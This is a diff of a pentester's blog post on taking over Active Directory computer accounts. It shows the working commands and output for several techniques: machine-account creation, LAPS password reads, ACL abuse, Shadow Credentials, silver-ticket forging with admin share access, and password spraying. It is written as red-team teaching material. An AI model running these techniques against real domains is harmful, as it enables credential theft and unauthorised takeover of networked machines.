@@ -9,31 +9,25 @@
   <link rel="stylesheet" href="https://latest.cactus.chat/style.css" type="text/css">
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <title> The differents takeover methods over ComputerObject | </title>
+  <title> Primitives to take over ComputerObject | </title>
   <link rel = 'canonical' href = '/posts/computerobject/'>
   <meta name="description" content="Red Teamer / Pentester. Focus on Active Directory / Azure / Windows logical bug">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="robots" content="all,follow">
   <meta name="googlebot" content="index,follow,snippet,archive">
-  <meta property="og:title" content="The differents takeover methods over ComputerObject" />
-<meta property="og:description" content="0. Active Directory Computer Object : A brief overview 1. Computer account authentication 101 2.1 Authentication 2.2 Computer account password update 2. Different exploitable path to computer account 2.1 Add computer account  Pre-requisite : MS-DS-Machine-Account-Quota &gt; 0 for domain users/authenticated users
-Tools : RSAT,PowerMad,Standin,Impacket,..
- 2.2 Graph attack 2.2 Resource Based Constrained Delegation  Pre-requisite : One machine account AND GenericAll1
-Tools : RSAT,PowerMad,Standin,Impacket,..
- 2.3 Read LAPS Attribute  Pre-requisite : ExtendedAllRights on the Computer Account" />
+  <meta property="og:title" content="Primitives to take over ComputerObject" />
+<meta property="og:description" content="1. Active Directory Computer Object : A brief overview The computer account is a Security Principal which is a key part of the Active Directory Services. Each computer or server which is joined to the domain has his own computer account, which is essentials for many tasks suchs as :
+ Establish a secure channel for the user authentication Deploy a GPO tied to a computer and not a user Identify the computer as a workstation, server or domain controller Used to access network resources as a low-privileged account Unrestricted access to the resources on the local machine &hellip;  One thing to keep in mind : the password management of the computer account is delegated to the Active Directory which renders password spraying or Kerberoasting useless in most cases." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="/posts/computerobject/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2022-04-29T19:39:47+02:00" />
-<meta property="article:modified_time" content="2022-04-29T19:39:47+02:00" /><meta property="og:site_name" content="Ottersec Blog" />
+<meta property="article:published_time" content="2022-05-18T18:39:47+02:00" />
+<meta property="article:modified_time" content="2022-05-18T18:39:47+02:00" /><meta property="og:site_name" content="Ottersec Blog" />
 
 
   <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="The differents takeover methods over ComputerObject"/>
-<meta name="twitter:description" content="0. Active Directory Computer Object : A brief overview 1. Computer account authentication 101 2.1 Authentication 2.2 Computer account password update 2. Different exploitable path to computer account 2.1 Add computer account  Pre-requisite : MS-DS-Machine-Account-Quota &gt; 0 for domain users/authenticated users
-Tools : RSAT,PowerMad,Standin,Impacket,..
- 2.2 Graph attack 2.2 Resource Based Constrained Delegation  Pre-requisite : One machine account AND GenericAll1
-Tools : RSAT,PowerMad,Standin,Impacket,..
- 2.3 Read LAPS Attribute  Pre-requisite : ExtendedAllRights on the Computer Account"/>
+<meta name="twitter:title" content="Primitives to take over ComputerObject"/>
+<meta name="twitter:description" content="1. Active Directory Computer Object : A brief overview The computer account is a Security Principal which is a key part of the Active Directory Services. Each computer or server which is joined to the domain has his own computer account, which is essentials for many tasks suchs as :
+ Establish a secure channel for the user authentication Deploy a GPO tied to a computer and not a user Identify the computer as a workstation, server or domain controller Used to access network resources as a low-privileged account Unrestricted access to the resources on the local machine &hellip;  One thing to keep in mind : the password management of the computer account is delegated to the Active Directory which renders password spraying or Kerberoasting useless in most cases."/>
 
   
   
@@ -87,12 +81,6 @@ Tools : RSAT,PowerMad,Standin,Impacket,..
         
         
         <li>
-          <a class="icon" href="/posts/cheatsheet/" aria-label="Next">
-            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
-          </a>
-        </li>
-        
-        <li>
           <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
             <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
           </a>
@@ -123,42 +111,42 @@ Tools : RSAT,PowerMad,Standin,Impacket,..
     </a>
   </li>
   <li>
-    <a class="icon" href="https://twitter.com/share?url=%2fposts%2fcomputerobject%2f&text=The%20differents%20takeover%20methods%20over%20ComputerObject" aria-label="Twitter">
+    <a class="icon" href="https://twitter.com/share?url=%2fposts%2fcomputerobject%2f&text=Primitives%20to%20take%20over%20ComputerObject" aria-label="Twitter">
       <i class="fab fa-twitter " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.linkedin.com/shareArticle?url=%2fposts%2fcomputerobject%2f&title=The%20differents%20takeover%20methods%20over%20ComputerObject" aria-label="Linkedin">
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=%2fposts%2fcomputerobject%2f&title=Primitives%20to%20take%20over%20ComputerObject" aria-label="Linkedin">
       <i class="fab fa-linkedin " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=%2fposts%2fcomputerobject%2f&is_video=false&description=The%20differents%20takeover%20methods%20over%20ComputerObject" aria-label="Pinterest">
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=%2fposts%2fcomputerobject%2f&is_video=false&description=Primitives%20to%20take%20over%20ComputerObject" aria-label="Pinterest">
       <i class="fab fa-pinterest " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="mailto:?subject=The%20differents%20takeover%20methods%20over%20ComputerObject&body=Check out this article: %2fposts%2fcomputerobject%2f" aria-label="Email">
+    <a class="icon" href="mailto:?subject=Primitives%20to%20take%20over%20ComputerObject&body=Check out this article: %2fposts%2fcomputerobject%2f" aria-label="Email">
       <i class="fas fa-envelope " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://getpocket.com/save?url=%2fposts%2fcomputerobject%2f&title=The%20differents%20takeover%20methods%20over%20ComputerObject" aria-label="Pocket">
+    <a class="icon" href="https://getpocket.com/save?url=%2fposts%2fcomputerobject%2f&title=Primitives%20to%20take%20over%20ComputerObject" aria-label="Pocket">
       <i class="fab fa-get-pocket " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://reddit.com/submit?url=%2fposts%2fcomputerobject%2f&title=The%20differents%20takeover%20methods%20over%20ComputerObject" aria-label="reddit">
+    <a class="icon" href="http://reddit.com/submit?url=%2fposts%2fcomputerobject%2f&title=Primitives%20to%20take%20over%20ComputerObject" aria-label="reddit">
       <i class="fab fa-reddit " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=%2fposts%2fcomputerobject%2f&name=The%20differents%20takeover%20methods%20over%20ComputerObject&description=0.%20Active%20Directory%20Computer%20Object%20%3a%20A%20brief%20overview%201.%20Computer%20account%20authentication%20101%202.1%20Authentication%202.2%20Computer%20account%20password%20update%202.%20Different%20exploitable%20path%20to%20computer%20account%202.1%20Add%20computer%20account%20%20Pre-requisite%20%3a%20MS-DS-Machine-Account-Quota%20%26gt%3b%200%20for%20domain%20users%2fauthenticated%20users%0aTools%20%3a%20RSAT%2cPowerMad%2cStandin%2cImpacket%2c..%0a%202.2%20Graph%20attack%202.2%20Resource%20Based%20Constrained%20Delegation%20%20Pre-requisite%20%3a%20One%20machine%20account%20AND%20GenericAll1%0aTools%20%3a%20RSAT%2cPowerMad%2cStandin%2cImpacket%2c..%0a%202.3%20Read%20LAPS%20Attribute%20%20Pre-requisite%20%3a%20ExtendedAllRights%20on%20the%20Computer%20Account" aria-label="Tumblr">
+    <a class="icon" href="http://www.tumblr.com/share/link?url=%2fposts%2fcomputerobject%2f&name=Primitives%20to%20take%20over%20ComputerObject&description=1.%20Active%20Directory%20Computer%20Object%20%3a%20A%20brief%20overview%20The%20computer%20account%20is%20a%20Security%20Principal%20which%20is%20a%20key%20part%20of%20the%20Active%20Directory%20Services.%20Each%20computer%20or%20server%20which%20is%20joined%20to%20the%20domain%20has%20his%20own%20computer%20account%2c%20which%20is%20essentials%20for%20many%20tasks%20suchs%20as%20%3a%0a%20Establish%20a%20secure%20channel%20for%20the%20user%20authentication%20Deploy%20a%20GPO%20tied%20to%20a%20computer%20and%20not%20a%20user%20Identify%20the%20computer%20as%20a%20workstation%2c%20server%20or%20domain%20controller%20Used%20to%20access%20network%20resources%20as%20a%20low-privileged%20account%20Unrestricted%20access%20to%20the%20resources%20on%20the%20local%20machine%20%26hellip%3b%20%20One%20thing%20to%20keep%20in%20mind%20%3a%20the%20password%20management%20of%20the%20computer%20account%20is%20delegated%20to%20the%20Active%20Directory%20which%20renders%20password%20spraying%20or%20Kerberoasting%20useless%20in%20most%20cases." aria-label="Tumblr">
       <i class="fab fa-tumblr " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://news.ycombinator.com/submitlink?u=%2fposts%2fcomputerobject%2f&t=The%20differents%20takeover%20methods%20over%20ComputerObject" aria-label="Hacker News">
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=%2fposts%2fcomputerobject%2f&t=Primitives%20to%20take%20over%20ComputerObject" aria-label="Hacker News">
       <i class="fab fa-hacker-news " aria-hidden="true"></i>
     </a>
   </li>
@@ -169,25 +157,14 @@ Tools : RSAT,PowerMad,Standin,Impacket,..
     <div id="toc">
       <nav id="TableOfContents">
   <ul>
-    <li><a href="#21-authentication">2.1 Authentication</a></li>
-    <li><a href="#22-computer-account-password-update">2.2 Computer account password update</a></li>
-  </ul>
-
-  <ul>
     <li><a href="#21-add-computer-account">2.1 Add computer account</a></li>
-    <li><a href="#22-graph-attack">2.2 Graph attack</a>
-      <ul>
-        <li><a href="#22-resource-based-constrained-delegation">2.2 Resource Based Constrained Delegation</a></li>
-        <li><a href="#23-read-laps-attribute">2.3 Read LAPS Attribute</a></li>
-      </ul>
-    </li>
-    <li><a href="#24-shadow-credentials">#2.4 Shadow Credentials</a></li>
-    <li><a href="#25-change-computer-account-password">2.5 Change computer account password</a></li>
-    <li><a href="#26-password-spraying">2.6 Password spraying</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#31-silver-ticket">3.1 Silver ticket</a></li>
+    <li><a href="#22-read-laps-attribute">2.2 Read LAPS Attribute</a></li>
+    <li><a href="#23-shadow-credentials">#2.3 Shadow Credentials</a></li>
+    <li><a href="#24-force-change-computer-account-password">2.4 Force Change computer account password</a></li>
+    <li><a href="#25-password-spraying">2.5 Password spraying</a></li>
+    <li><a href="#26-ntlm-relay-machine-account">2.6 NTLM Relay machine account</a></li>
+    <li><a href="#27-resource-based-constrained-delegation">2.7 Resource Based Constrained Delegation</a></li>
+    <li><a href="#28-contrained-delegation">2.8 Contrained delegation</a></li>
   </ul>
 </nav>
     </div>
@@ -199,13 +176,13 @@ Tools : RSAT,PowerMad,Standin,Impacket,..
   <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
     <header>
       <h1 class="posttitle" itemprop="name headline">
-        The differents takeover methods over ComputerObject
+        Primitives to take over ComputerObject
       </h1>
       <div class="meta">
         
         <div class="postdate">
           
-          <time datetime="2022-04-29 19:39:47 &#43;0200 CEST" itemprop="datePublished">2022-04-29</time>
+          <time datetime="2022-05-18 18:39:47 &#43;0200 CEST" itemprop="datePublished">2022-05-18</time>
           
         </div>
         
@@ -218,52 +195,368 @@ Tools : RSAT,PowerMad,Standin,Impacket,..
   
     
     <div class="content" itemprop="articleBody">
-      <h1 id="0-active-directory-computer-object--a-brief-overview">0. Active Directory Computer Object : A brief overview</h1>
-<h1 id="1-computer-account-authentication-101">1. Computer account authentication 101</h1>
-<h2 id="21-authentication">2.1 Authentication</h2>
-<h2 id="22-computer-account-password-update">2.2 Computer account password update</h2>
+      <h1 id="1-active-directory-computer-object--a-brief-overview">1. Active Directory Computer Object : A brief overview</h1>
+<p>The <strong>computer account</strong> is a <strong>Security Principal</strong> which is a key part of the Active Directory Services. Each computer or server which is joined to the domain has his <strong>own computer account</strong>, which is essentials for many tasks suchs as :</p>
+<ul>
+<li>Establish a secure channel for the user authentication</li>
+<li>Deploy a GPO tied to a computer and not a user</li>
+<li>Identify the computer as a workstation, server or domain controller</li>
+<li>Used to access network resources as a low-privileged account</li>
+<li>Unrestricted access to the resources on the local machine
+&hellip;</li>
+</ul>
+<p>One thing to keep in mind : the password management of the computer account is <strong>delegated to the Active Directory</strong> which renders password spraying or Kerberoasting useless in most cases.</p>
 <h1 id="2-different-exploitable-path-to-computer-account">2. Different exploitable path to computer account</h1>
+<p>We will see through this article 8 different way to take control or exploit the different features that may be associated with a computer account.</p>
+<ul>
+<li>Add a computer to the domain</li>
+<li>Read the LAPS attribute</li>
+<li>Shadow credentials</li>
+<li>Password Spraying</li>
+<li>Resource delegation and constrained delegation</li>
+<li>Authentication coercion / DHCP/LLMNR/&hellip; spoofing into NTLM relay</li>
+</ul>
+<p><em>Note : The unconstrained delegation will be skipped since it&rsquo;s going to be a bit out of scope here. Keep in mind though that if you managed to compromise a server with a unconstrained delegation, you virtually compromised the domain.</em></p>
 <h2 id="21-add-computer-account">2.1 Add computer account</h2>
 <hr>
-<p><strong>Pre-requisite</strong> : <em>MS-DS-Machine-Account-Quota &gt; 0 for domain users/authenticated users</em></p>
-<p><strong>Tools</strong>         : <em>RSAT,PowerMad,Standin,Impacket,..</em></p>
+<p><strong>Prerequisite</strong> : <em>MS-DS-Machine-Account-Quota &gt; 0 for domain users/authenticated users</em></p>
+<p><strong>Tools</strong>         : <em>RSAT,<a href="https://github.com/Kevin-Robertson/Powermad">PowerMad</a>,<a href="https://github.com/FuzzySecurity/StandIn">Standin</a>,<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py">Impacket</a>,..</em></p>
 <hr>
-<h2 id="22-graph-attack">2.2 Graph attack</h2>
-<h3 id="22-resource-based-constrained-delegation">2.2 Resource Based Constrained Delegation</h3>
+<p>In a default <strong>Active Directory</strong> environment, the <em>authenticated users</em> are allowed to add up to 10 computer account. This is materialized on the Domain by the <em>ms-DS-MachineAccountQuota</em> attribute.
+You can get this property value by reading the domain object through ldapsearch :</p>
+<pre tabindex="0"><code>ldapsearch -H ldap://192.168.1.43 -x -W -D &#34;administrator@test.local&#34; -b &#34;dc=test,dc=local&#34; &#34;(objectclass=domain)&#34; |grep ms-DS-MachineAccountQuota
+ms-DS-MachineAccountQuota: 10
+</code></pre><p>For the GUI-fan you can achieve the same through <strong>ADSIEdit</strong> or <strong>ADExplorer</strong> :
+<img src="/img/adexplorer.png" alt="ADExplorer"></p>
+<p>Nevertheless keep in mind that as time goes by, many companies are setting the <strong>ms-DS-MachineAccountQuota</strong> to 0 in order to prevent this default behavior. Most of the time this is replaced by the creation of a privileged group/User
+which has the <strong>Create Computer object</strong> right on some targeted OU (ex : OU=SpecialComputers,DC=test,DC=local).</p>
+<p><img src="/img/addcomputer.png" alt="AddComputer"></p>
+<p>Now that we have either the default ms-DS-MachineQuota settings or the AddComputer right we can add our computer object by using one of the available tools such as PowerMad :</p>
+<pre tabindex="0"><code># PowerMad : From a launched runas /netonly powershell + Proxifier (SOCKS Proxy for Windows)
+New-MachineAccount -Domain test.local -DomainController 192.168.1.43 -MachineAccount UserAddedComputer
+Enter a password for the new machine account: ************
+[+] Machine account UserAddedComputer added
+</code></pre><p>Or as another example we can user the StandIn tool (you have to use it from a joined computer/beacon):
+<img src="/img/standin.png" alt="StandIn"></p>
+<p>Please note that we now have control over a <strong>computer object</strong> (e.g:Owns) and that we can use (we indeed know the password since we set it !) it to leverage new path such as :</p>
+<ul>
+<li>RBCD</li>
+<li>Request Certificate Template only available to Domain Computer</li>
+<li>Access share only available to Domain Computer</li>
+<li>&hellip;</li>
+</ul>
+<h2 id="22-read-laps-attribute">2.2 Read LAPS Attribute</h2>
 <hr>
-<p><strong>Pre-requisite</strong> : <em>One machine account AND GenericAll<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></em></p>
-<p><strong>Tools</strong>         : <em>RSAT,PowerMad,Standin,Impacket,..</em></p>
+<p><strong>Prerequisite</strong> : <em>ExtendedAllRights on the Computer Account</em></p>
+<p><strong>Tools</strong>         : <em><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a>,<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer">ADExplorer</a></em></p>
 <hr>
-<h3 id="23-read-laps-attribute">2.3 Read LAPS Attribute</h3>
+<p>One of the most &ldquo;common&rdquo; cases that you can encounter in some kind-of-mature infrastructure will be the deployment of <strong>LAPS</strong>. This service delegate the password management of the local Administrator to the AD DS which will change the password automatically and have
+the huge benefits of having unique password for each endpoint managed by LAPS.</p>
+<p>The managed Local Administrator password will be stored within the LDAP Attribute <strong>ms-mcs-AdmPwd</strong> (clear text password) and <strong>ms-mcs-AdmPwdExpirationTime (expiration time)</strong>.</p>
+<p>The &ldquo;Standard&rdquo; way for an administrator to access the Local Administrator Password would be through powershell or the LAPS UI :</p>
+<p><img src="/img/laps_ui.png" alt="LAPS UI"></p>
+<p>In our case if we happened to control an account to which the <strong>Read ms-Mcs-AdmPwd</strong> has been delegated we can leverage this in order to compromise our target. This is represent as the edge <strong>ReadLAPSPassword</strong> :</p>
+<p><img src="/img/laps.png" alt="ReadLAPS"></p>
+<p>We have several options to easily read the attribute by using the powershell module <strong>AdmPwd</strong> or the <strong>LAPS UI</strong> through <strong>Proxifier</strong>. Another way would be to simply use <strong>ldapsearch</strong> such as the following :</p>
+<pre tabindex="0"><code>ldapsearch -x -h 192.168.1.43 -D lapsreader -w Password1 -b &#34;dc=TEST,dc=LOCAL&#34; &#34;(ms-MCS-AdmPwd=*)&#34;
+...
+sAMAccountName: WKS1$
+sAMAccountType: 805306369
+operatingSystem: Windows 10 Enterprise
+operatingSystemVersion: 10.0 (18363)
+dNSHostName: wks1.test.local
+servicePrincipalName: RestrictedKrbHost/WKS1
+servicePrincipalName: HOST/WKS1
+servicePrincipalName: RestrictedKrbHost/wks1.test.local
+servicePrincipalName: HOST/wks1.test.local
+objectCategory: CN=Computer,CN=Schema,CN=Configuration,DC=test,DC=local
+isCriticalSystemObject: FALSE
+dSCorePropagationData: 20220513075736.0Z
+dSCorePropagationData: 20220513075458.0Z
+dSCorePropagationData: 20220513071618.0Z
+dSCorePropagationData: 20220513071552.0Z
+dSCorePropagationData: 16010714223649.0Z
+lastLogonTimestamp: 132967412711555866
+msDS-SupportedEncryptionTypes: 28
+ms-Mcs-AdmPwdExpirationTime: 132994927172840387
+ms-Mcs-AdmPwd: THD3mAn.+Y5E9Y
+...
+</code></pre><p><em>Note : You can filter out the output to only have the password by simply adding ms-MCS-AdmPwd</em></p>
+<p>Keep in mind that tons of different tools can also do that such as : <strong>LapsDumper</strong>,<strong>enum_laps</strong>,<strong>pyLAPS</strong>,<strong>PowerView</strong> &hellip;</p>
+<h2 id="23-shadow-credentials">#2.3 Shadow Credentials</h2>
 <hr>
-<p><strong>Pre-requisite</strong> : <em>ExtendedAllRights on the Computer Account</em></p>
-<p><strong>Tools</strong>         : <em>PowerView,ADExplorer</em></p>
+<p><strong>Prerequisite Edge</strong> : <em>Domain Functionnal level 2016 + One DC &gt;= 2016 (with his own certificate) and a deployed PKI (ex : AD CS)</em> and <em>ExtendedRights (Write to msDS-KeyCredentialLink), GenericWrite, GenericAll<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></em></p>
+<p><strong>Tools</strong>           : <em><a href="https://github.com/ShutdownRepo/pywhisker">pywhisker</a>,<a href="https://github.com/eladshamir/Whisker">whisker</a>,<a href="https://github.com/dirkjanm/PKINITtools">pkinit</a></em></p>
 <hr>
-<h2 id="24-shadow-credentials">#2.4 Shadow Credentials</h2>
+<p>Let&rsquo;s take a concrete example where you have the <strong>WriteOwner</strong> privilege over a computer account such as the following :</p>
+<p><img src="/img/write_owner.png" alt="OwnerPriv"></p>
+<p>In order to take the <strong>Ownership</strong> of this object, we can use the <strong>Powerview</strong> framework to perform the following tasks :</p>
+<ul>
+<li>Take ownership of the <strong>wks1</strong> computer through the edge <em>writeOwner</em></li>
+<li>Write the proper desired ACL entry : <strong>GenericAll</strong> over the wks1 computer (we can select the user that suit us the most,we will stick to <strong>ownerwks1</strong> here)</li>
+</ul>
+<pre tabindex="0"><code># Take ownership of wks1
+Set-DomainObjectOwner -OwnerIdentity ownerwks1 -Identity wks1
+</code></pre><p><img src="/img/owner.png" alt="LookupSID"></p>
+<pre tabindex="0"><code># Modify the DACL of WKS1 in order to grant ouself the FullControl over the object
+Add-DomainObjectAcl -Rights All -TargetIdentity wks1 -PrincipalIdentity ownerwks1 -Verbose       
+VERBOSE: [Get-DomainSearcher] search base: LDAP://DC1.TEST.LOCAL/DC=TEST,DC=LOCAL
+VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
+(&amp;(|(|(samAccountName=ownerwks1)(name=ownerwks1)(displayname=ownerwks1))))
+VERBOSE: [Get-DomainSearcher] search base: LDAP://DC1.TEST.LOCAL/DC=TEST,DC=LOCAL
+VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&amp;(|(|(samAccountName=wks1)(name=wks1)(displayname=wks1))))
+VERBOSE: [Add-DomainObjectAcl] Granting principal CN=ownerwks1,CN=Users,DC=test,DC=local &#39;All&#39; on
+CN=WKS1,OU=ComputerEN,DC=test,DC=local
+VERBOSE: [Add-DomainObjectAcl] Granting principal CN=ownerwks1,CN=Users,DC=test,DC=local rights GUID
+&#39;00000000-0000-0000-0000-000000000000&#39; on CN=WKS1,OU=ComputerEN,DC=test,DC=local
+</code></pre><p><img src="/img/modifyacl.png" alt="ModifyACL"></p>
+<p>After successfully adding the GenericAll ACL to our user on this computer account, two choices are left for us to fully compromise this computer :</p>
+<ul>
+<li>Shadow Credentials (if you&rsquo;re not familiar with this technic please read <a href="https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab">this</a> excellent blog post as we will not explain it here)</li>
+<li>RBCD</li>
+<li><del>Change Password</del></li>
+</ul>
+<p>As the RBCD and the Shadow Credentials attacks requires different sorts of prerequisite, you may have to use one or the other from time to time. We&rsquo;ll use the <strong>Shadow Credentials</strong> on this one.</p>
+<p>In order to perform the <strong>Shadow credentials</strong> attack, we have to add our cryptographic material to the <strong>msDS-KeyCredentialLink</strong> attribute of the targeted computer account (we will use <strong>pywhisker</strong> here).</p>
+<p><img src="/img/pywhisker.png" alt="pyWhisker"></p>
+<p>*Note : If the domain level is &lt; 2016 you will have an * <strong>invalid attribute type msDS-KeyCredentialLink</strong> <em>error</em></p>
+<p>Once done we can either authenticate ourself as the computer account by using our <strong>pfx certificate</strong><sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup> or retrieve the NT Hash of the targeted computer account by leveraging the <strong>PKINIT</strong> :</p>
+<p><img src="/img/pkinit.png" alt="pkinit">
+<img src="/img/nthash.png" alt="nthash"></p>
+<p>We an now craft our silver ticket to access our target as <strong>Domain Administrator</strong> :</p>
+<pre tabindex="0"><code>ticketer.py -nthash 8bdfb5d365a7aca2bfe5e69942c10a34 -domain-sid S-1-5-21-3876195775-1803233878-2707476369 -domain test.local -spn host/WKS1 WKS1\$
+Impacket v0.9.24.dev1+20211022.182843.4229481c - Copyright 2021 SecureAuth Corporation
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for test.local/WKS1$
+[*]     PAC_LOGON_INFO
+[*]     PAC_CLIENT_INFO_TYPE
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*]     PAC_SERVER_CHECKSUM
+[*]     PAC_PRIVSVR_CHECKSUM
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Saving ticket in WKS1$.ccache
+export KRB5CCNAME=WKS1\$.ccache
+smbclient.py -no-pass -k TEST.LOCAL/WKS1\$@wks1.test.local
+Impacket v0.9.24.dev1+20211022.182843.4229481c - Copyright 2021 SecureAuth Corporation
+
+Type help for list of commands
+# use C$
+# ls 
+drw-rw-rw-          0  Mon May 16 10:07:31 2022 $Recycle.Bin
+drw-rw-rw-          0  Mon May 16 10:37:18 2022 $WINDOWS.~BT
+drw-rw-rw-          0  Sat May 14 00:29:10 2022 $WinREAgent
+drw-rw-rw-          0  Wed May 11 10:00:48 2022 Documents and Settings
+-rw-rw-rw- 1476395008  Mon May 16 13:21:31 2022 pagefile.sys
+drw-rw-rw-          0  Wed May 11 19:55:34 2022 PerfLogs
+drw-rw-rw-          0  Sat May 14 00:29:06 2022 Program Files
+drw-rw-rw-          0  Wed May 11 13:51:35 2022 Program Files (x86)
+drw-rw-rw-          0  Fri May 13 18:47:02 2022 ProgramData
+drw-rw-rw-          0  Wed May 11 10:00:55 2022 Recovery
+-rw-rw-rw-  268435456  Mon May 16 13:21:31 2022 swapfile.sys
+drw-rw-rw-          0  Wed May 11 10:03:37 2022 System Volume Information
+drw-rw-rw-          0  Mon May 16 10:06:52 2022 Users
+drw-rw-rw-          0  Mon May 16 10:37:22 2022 Windows
+</code></pre><p><em>Note : [-] SMB SessionError: STATUS_MORE_PROCESSING_REQUIRED({Still Busy} : Likely not the same user between ticketer &amp; smbclient</em></p>
+<p><em>Note2 : [-] Kerberos SessionError: KDC_ERR_PREAUTH_FAILED : If you&rsquo;re 100% sure about your NT hash, double check that you&rsquo;re using the FQDN and not the IP for the target</em></p>
+<h2 id="24-force-change-computer-account-password">2.4 Force Change computer account password</h2>
 <hr>
-<p><strong>Pre-requisite Edge</strong> : <em>GenericWrite, GenericAll<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></em></p>
-<p><strong>Tools</strong>           : <em>pywhisker,whisker</em></p>
-<hr>
-<h2 id="25-change-computer-account-password">2.5 Change computer account password</h2>
-<hr>
-<p><strong>Pre-requisite Edge</strong> : <em>ForceChangePassword, GenericAll<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></em></p>
+<p><strong>Prerequisite Edge</strong> : <em>ForceChangePassword, GenericAll<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></em></p>
 <p><strong>Tools</strong>           : <em>rpcclient,net</em></p>
 <hr>
-<h2 id="26-password-spraying">2.6 Password spraying</h2>
+<p>There may be some &ldquo;extreme&rdquo; use case when your only option left will be to change the password of the targeted computer account. More precisely when :</p>
+<ul>
+<li>The associated host is offline (RBCD KO) <strong>AND</strong> no AD CS are available (Template/PKINIT KO)</li>
+<li>The only right present is ForceChangePassword (Very unlikely)</li>
+</ul>
+<p><strong>WARNING</strong> : Do not exploit it <strong>without formal approval</strong> as this will <strong>most likely break stuff</strong>. Only use this option as a last resort when the targeted computer account is some kind of leftover artifact without other ways to exploit it.</p>
+<p>This technic will be pretty much straight forward. One thing to note is that you won&rsquo;t be able to &ldquo;set&rdquo; the password by using some GUI stuff (e.g : ADSIEdit,RSAT and so on) as this is not a &ldquo;normal&rdquo; administrative behavior. The primitives that let you
+set the password are well explained in <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/password-change-mechanisms">this article</a> (change != set)</p>
+<p>One easy way to do it will be to use the <strong>net</strong> utility tool such as the following :</p>
+<pre tabindex="0"><code># 1. Net tool from samba
+net rpc password VulnerablePASSW\$ -U &#34;TEST.LOCAL\User&#34; -S 192.168.1.43
+Enter new password for VulnerablePASSW$:
+Enter TEST.LOCAL\User&#39;s password: 
+</code></pre><h2 id="25-password-spraying">2.5 Password spraying</h2>
 <hr>
 <p><strong>Pre-requisite</strong> : <em>None</em></p>
-<p><strong>Tools</strong>         : <em>CrackMapExec,smbclient,&hellip;</em></p>
+<p><strong>Tools</strong>         : <em><a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a>,smbclient,&hellip;</em></p>
 <hr>
-<h1 id="3-from-our-computer-account-to-new-horizons">3. From our computer account to new horizons</h1>
-<h2 id="31-silver-ticket">3.1 Silver ticket</h2>
+<p>On the 10th of May Oddvar Moe published an <a href="https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/">excellent article</a> on pre-created computer accounts. In the end this could allow us to perform some password spraying on specific computer account.</p>
+<p>According to his excellent article every computer object that has the box &ldquo;Pre-Windows 2000 Computer&rdquo; ticked will <strong>initially have a password equal to his name</strong> until being used (which will require a password change).</p>
+<p>We can narrow down our spraying to the following LDAP filter :</p>
+<pre tabindex="0"><code>(&amp;(logonCount=0)(userAccountControl=4128))
+</code></pre><p>On the same level, the <strong>dsadd</strong> tool will initially set a <strong>blank</strong> password and will not require a password change in order to be used.</p>
+<p><img src="/img/prepopulated.png" alt="PrePopulated"></p>
+<p>If we try to spray this account with <em>dumpwks</em> we should be welcomed by <strong>STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</strong> which means the sprayed password was working !</p>
+<pre tabindex="0"><code>smbclient.py TEST.LOCAL/DumpWKS\$:&#34;dumpwks&#34;@192.168.1.43
+
+Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
+
+[-] SMB SessionError: STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT(The account used is a computer account. Use your global user account or local user account to access this server.)
+</code></pre><p>We just now have to change password of the targeted computer account and we will be able to use it :
+<img src="/img/kpasswd.png" alt="Kpasswd"></p>
+<p>As a <strong>password spraying may be noisy,</strong> an alternative would have been to request a service ticket on the targeted computer account and try to crack them offline &hellip;
+but unfortunately for us the <strong>ServicePrincipalName</strong> attribute <strong>is not populated</strong> immediately when the computer account is created <strong>&ldquo;manually&rdquo;</strong> (at least initially while not used on a proper computer).</p>
+<h2 id="26-ntlm-relay-machine-account">2.6 NTLM Relay machine account</h2>
 <hr>
